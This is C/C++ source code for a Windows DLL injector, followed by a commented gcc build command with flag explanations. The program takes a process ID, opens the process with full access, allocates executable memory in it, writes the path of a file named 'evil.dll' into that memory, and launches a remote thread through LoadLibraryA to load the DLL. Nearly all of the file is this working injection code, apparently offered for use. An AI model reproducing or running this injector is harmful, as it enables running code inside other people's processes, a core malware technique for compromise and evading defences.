#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  // parse process ID
  if ( atoi(argv[1]) == 0) {
      printf("PID not found :( exiting...\n");
      return -1;
  }
  printf("PID: %i", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}

// Command of GCC compiler to create executable file:
//
//   gcc -O2 injector.cpp -o injector.exe -mconsole -I C:\msys64\mingw64\include -s -ffunction-sections
//       -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ 
//       -static-libgcc -fpermissive 
//
// -O2                   : Optimize the code (level 2)
// -o                    : Output file name (injector.exe)
// -mconsole             : Create a console application (instead of a GUI application)
// -I                    : Include directory (for example, C:\msys64\mingw64\include)
// -s                    : Strip the executable file (remove all symbols and debug information)
// -ffunction-sections   : Place each function in its own section (for linker)
// -fdata-sections       : Place each data object in its own section (for linker)
// -Wno-write-strings    : Ignore warnings about writing to string literals (for example, "hello")
// -fno-exceptions       : Disable exception handling (for example, try/catch)
// -fmerge-all-constants : Merge all constants into a single read-only data section
// -static-libstdc++     : Link to static libstdc++ library file
// -static-libgcc        : Link to static libgcc library file
// -fpermissive          : Ignore some errors (for example, Main function is not defined)
//
// One line command: gcc -O2 injector.cpp -o injector.exe -mconsole -I C:\msys64\mingw64\include -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive

